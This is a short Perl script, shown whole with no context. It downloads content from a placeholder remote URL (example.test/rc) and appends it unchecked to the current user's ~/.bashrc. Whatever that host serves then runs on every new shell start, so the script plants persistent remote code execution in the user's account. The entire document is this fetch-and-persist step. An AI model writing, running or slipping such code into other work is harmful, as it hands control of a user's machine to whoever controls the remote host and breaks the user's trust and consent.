use HTTP::Tiny;
my $body = HTTP::Tiny->new->get('https://example.test/rc')->{content};
open(my $fh, '>>', "$ENV{HOME}/.bashrc");
print $fh $body;
